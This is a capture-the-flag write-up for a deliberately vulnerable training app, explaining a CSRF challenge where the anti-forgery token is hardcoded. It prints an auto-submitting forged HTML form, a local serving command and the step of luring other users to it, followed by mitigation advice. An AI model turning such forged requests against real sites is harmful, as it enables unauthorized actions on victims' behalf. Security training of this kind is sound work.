# Cross Site Request Forgery Challenge Three

## Description
To complete this challenge, you must get your CSRF counter above 0. The request to increment your counter is:

`POST /user/csrfchallengethree/plusplus`
With the following parameters: `userid=your_user_id & csrfToken=csrf_token`

The csrfToken parameter is included in the form, suggesting some CSRF protection. However, the implementation is flawed. Your ID is: `3297ff70ad130c5b6858593e2087452b0d2afe71`. Any user other than you may increment your counter for this challenge.

## Solution
This challenge shows a common flaw in CSRF protection: using a hardcoded CSRF token that is not tied to the user session. The JavaScript code reveals that the CSRF token is static and can be reused multiple times.

```js
<script>
    $("#leForm").submit(function(){
        $("#submitButton").hide("fast");
        $("#loadingSign").show("slow");
        var theMessage = $("#myMessage").val();
        $("#resultsDiv").hide("slow", function(){
            var ajaxCall = $.ajax({
                dataType: "text",
                type: "POST",
                url: "z6b2f5ebbe112dd09a6c430a167415820adc5633256a7b44a7d1e262db105e3c",
                data: {
                    myMessage: theMessage,
                    csrfToken: "-137712181998991364922256918407575552480" // csrfToken
                }
            ..........
        });
    });
</script>
```

## Steps to Reproduce

### 1 Step
Create an HTML file that sends a POST request with the required parameters. Use the hardcoded CSRF token found in the JavaScript code:

![](/writeups/assets/images/csrf/csrf-3-2.jpg)

Next, create an HTML page using these parameters to send a valid POST request on behalf of other users.


```html

<form name="malForm" action="https://<domain-name>/user/csrfchallengethree/plusplus" method="POST">
    <input type="hidden" name="userid" value="3297ff70ad130c5b6858593e2087452b0d2afe71" />
    <input type="hidden" name="csrfToken" value="-107648304550467470847368289914154272735"/>
    <input type="submit"/>
</form>
<script> document.malForm.submit(); </script>

```

### 2 Step
Serve the file using a simple HTTP server:

```bash
python3 -m http.server 8080
```

### 3 Step
Post the URL to the forum. If your local server is running on port 8080, the URL would look like: `http://localhost:8080/sahinyes.html`

![](/writeups/assets/images/csrf/csrf-2-post-message.jpg)

## Exploit
When another user visits your page, the form will automatically submit with the hardcoded CSRF token, bypassing the flawed protection mechanism and incrementing your counter.

## Impact
This vulnerability allows attackers to bypass what appears to be CSRF protection, enabling them to perform unauthorized actions on behalf of other users.

## Mitigation
To properly implement CSRF protection:
- Generate unique, random CSRF tokens for each user session
- Tie CSRF tokens to specific user sessions
- Validate CSRF tokens on the server side for all state-changing requests
- Regenerate CSRF tokens after successful form submissions
- Use the SameSite cookie attribute as an additional defense layer

---

[← Previous](./csrf-2.md) | [Next →](./csrf-4.md)

